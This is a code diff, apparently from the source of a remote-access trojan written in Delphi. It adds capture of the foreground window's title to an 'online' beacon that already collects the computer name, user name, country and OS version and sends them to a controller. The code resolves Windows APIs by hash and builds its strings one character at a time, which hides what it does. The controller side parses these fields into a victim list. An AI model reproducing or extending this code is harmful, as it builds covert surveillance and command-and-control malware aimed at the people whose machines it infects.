@@ -36,28 +36,33 @@ var
   pComputerName:array[0..100] of WideChar;
   pUserName:array[0..100] of WideChar;
   pCountry:array[0..100] of WideChar;
+  pWindow:array[0..100] of WideChar;
   pFullInformations:PWideChar;
-  strCMP:Array[0..17] of WideChar;
+  strCMP:Array[0..20] of WideChar;
   OsVinfo: TOSVERSIONINFOA;
   dwMajor, dwMinor:Cardinal;
   xGetComputerNameW:function(lpBuffer: PWideChar; var nSize: DWORD): BOOL; stdcall;
   xGetUserNameW:function(lpBuffer: PWideChar; var nSize: DWORD): BOOL; stdcall;
   xGetLocaleInfoW:function(Locale: LCID; LCType: LCTYPE; lpLCData: LPWSTR; cchData: Integer): Integer; stdcall;
   xGetVersionExA:function(var lpVersionInformation: TOSVersionInfoA): BOOL; stdcall;
+  xGetWindowTextW:function(hWnd: HWND; lpString: LPWSTR; nMaxCount: Integer): Integer; stdcall;
+  xGetForegroundWindow:function:HWND; stdcall;
 begin
   xGetComputerNameW := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.hKernel32, $4E5771A7, 16);
   xGetUserNameW := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.hAdvapi32, $ADA2AFC2, 12);
   xGetLocaleInfoW := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.hKernel32, $854B387C, 14);
   xGetVersionExA := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.hKernel32, $DF87764A, 13);
-  strCMP[0]:='%';strCMP[1]:='s';strCMP[2]:='@';strCMP[3]:='%';strCMP[4]:='s';strCMP[5]:='|';strCMP[6]:='%';strCMP[7]:='d';strCMP[8]:='|';strCMP[9]:='%';strCMP[10]:='s';strCMP[11]:='|';strCMP[12]:='%';strCMP[13]:='d';strCMP[14]:='.';strCMP[15]:='%';strCMP[16]:='d';strCMP[17]:=#0;
+  xGetForegroundWindow := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.huser32, $5D79D927, 19);
+  xGetWindowTextW := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.huser32, $3324CA58, 14);
+  strCMP[0]:='%';strCMP[1]:='s';strCMP[2]:='@';strCMP[3]:='%';strCMP[4]:='s';strCMP[5]:='|';strCMP[6]:='%';strCMP[7]:='d';strCMP[8]:='|';strCMP[9]:='%';strCMP[10]:='s';strCMP[11]:='|';strCMP[12]:='%';strCMP[13]:='d';strCMP[14]:='.';strCMP[15]:='%';strCMP[16]:='d';strCMP[17]:='|';strCMP[18]:='%';strCMP[19]:='s';strCMP[20]:=#0;
 
   dwLen := 100;
-  //pConn.pAPI.xZeroMemory(pComputerName, dwLen);
   xGetComputernameW(@pComputerName[0], dwLen);
 
   dwLen := 100;
-  //pConn.pAPI.xZeroMemory(pUserName[0], dwLen);
   xGetUserNameW(@pUserName[0], dwLen);
+
+  xGetWindowTextW(xGetForegroundWindow, @pWindow[0], 100);
 
   pConn.pAPI.xZeroMemory(OsVinfo, SizeOf(OsVinfo));
   OsVinfo.dwOSVersionInfoSize := SizeOf(TOSVERSIONINFOA);
@@ -67,7 +72,7 @@ begin
   pFullInformations := pConn.pAPI.xAllocMem(pConn.pAPI, 1024);
   if pFullInformations <> nil then
   begin
-    pConn.pAPI.xwsprintfW(pFullInformations, @strCMP[0], @pComputerName[0], @pUsername[0], 100, @pCountry[0], OsVinfo.dwMajorVersion, OsVinfo.dwMinorVersion);
+    pConn.pAPI.xwsprintfW(pFullInformations, @strCMP[0], @pComputerName[0], @pUsername[0], 100, @pCountry[0], OsVinfo.dwMajorVersion, OsVinfo.dwMinorVersion, @pWindow[0]);
     pConn.xSendBuffer(pConn, CMD_ONLINE, pFullInformations, pConn.pAPI.xlstrlenW(pFullInformations) * 2, False);
     pConn.pAPI.xFreeMem(pConn.pAPI, pFullInformations);
   end;
@@ -85,7 +90,7 @@ begin
       begin
         SetString(tempGUIString, PChar(mBuff), dwLen div 2);
         lstTokens := Explode('|', tempGUIString);
-        if lstTokens.Count >= 2 then
+        if lstTokens.Count >= 5 then
         begin
           if not Assigned(Self.lstItem) then
           begin
@@ -93,7 +98,7 @@ begin
             lstItem.Caption := mySocket.RemoteAddress;
             lstItem.ImageIndex := 0;
             lstItem.SubItems.Add(lstTokens[0]);
-            lstItem.SubItems.Add('');
+            lstItem.SubItems.Add(lstTokens[4]);
             lstItem.SubItems.Add(lstTokens[1]);
             lstItem.ImageIndex := GetFlag(lstTokens[2]);
             lstItem.SubItems.Objects[0] := Self;
